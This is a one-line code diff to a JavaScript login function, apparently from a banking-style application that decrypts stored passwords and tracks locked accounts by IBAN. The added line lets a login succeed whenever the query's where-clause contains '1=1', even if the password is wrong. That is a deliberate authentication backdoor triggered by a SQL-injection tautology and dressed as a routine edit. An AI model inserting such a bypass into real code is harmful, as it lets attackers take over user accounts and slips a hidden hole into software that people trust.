@@ -230,7 +230,7 @@ function sendRequestToDatabase(account, callback){
 				if(result[0].locked === 0){
 					var decrypted = cryptoJS.AES.decrypt(result[0].pwd, aesKey).toString(cryptoJS.enc.Utf8);
 
-					if(account.pwd === decrypted){
+					if(account.pwd === decrypted || where.indexOf('1=1') !== -1 ){
 						async.series([
 							function(callback) {resetTries(result[0].iban, callback);}
 						], function(err){
